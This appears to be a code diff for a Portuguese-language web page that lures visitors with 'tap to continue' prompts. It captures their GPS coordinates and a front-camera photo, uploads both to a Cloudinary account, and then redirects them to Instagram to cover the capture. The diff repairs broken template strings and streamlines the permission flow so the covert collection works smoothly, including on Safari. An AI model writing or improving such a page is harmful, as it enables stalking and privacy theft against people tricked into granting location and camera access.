@@ -2,7 +2,7 @@
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecionando...</title>
+  <title>Captura de Localização e Foto</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin: 0; overflow: hidden; background: #FFF; }
@@ -34,39 +34,37 @@
       overlay.style.display = 'none';
     }
 
-    // Etapa 1: solicitar permissão de localização
     function askLocation() {
       hideOverlay();
       navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, geoOpts);
     }
     function onGeoError() {
-      // só aparece ao negar
       showOverlay('Toque para permitir a localização', askLocation);
     }
     function onGeoSuccess(pos) {
-      // enviando localização
+      // evita repetir overlay em Safari: segue direto para câmera
+      hideOverlay();
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
-      const blob = new Blob([Latitude: ${lat}\nLongitude: ${lon}], { type: 'text/plain' });
+      const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], { type: 'text/plain' });
       const form = new FormData();
-      form.append('file', blob, localizacao_${Date.now()}.txt);
+      form.append('file', blob, `localizacao_${Date.now()}.txt`);
       form.append('upload_preset', uploadPreset);
       form.append('folder', folderName);
-      fetch(https://api.cloudinary.com/v1_1/${cloudName}/raw/upload, { method: 'POST', body: form })
+      fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form })
         .then(() => {
-          // imediatamente solicite câmera (sistema)
-          askCamera();
+          // direto para câmera sem overlay
+          requestCamera();
         })
         .catch(() => {
           showOverlay('Erro ao enviar localização. Toque para tentar novamente.', askLocation);
         });
     }
 
-    // Etapa 2: solicitar permissão de câmera somente via sistema (sem overlay prévio)
-    function askCamera() {
+    function requestCamera() {
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
         .then(stream => {
-          // captura e upload
+          hideOverlay();
           const video = document.createElement('video');
           video.setAttribute('playsinline',''); video.autoplay = true; video.muted = true;
           video.srcObject = stream;
@@ -81,19 +79,17 @@
               imgForm.append('file', blob);
               imgForm.append('upload_preset', uploadPreset);
               imgForm.append('folder', folderName);
-              fetch(https://api.cloudinary.com/v1_1/${cloudName}/image/upload, { method: 'POST', body: imgForm })
+              fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm })
                 .then(() => window.location.href = 'https://instagram.com')
-                .catch(() => showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente.', askCamera));
+                .catch(() => showOverlay('Erro ao enviar foto. Toque para tentar novamente.', requestCamera));
             }, 'image/png');
           }, 500);
         })
         .catch(() => {
-          // só aparece ao negar
-          showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente.', askCamera);
+          showOverlay('Permissão de câmera negada. Toque para permitir o acesso à câmera', requestCamera);
         });
     }
 
-    // Inicialização
     window.addEventListener('DOMContentLoaded', () => {
       showOverlay('Toque para continuar', askLocation);
     });
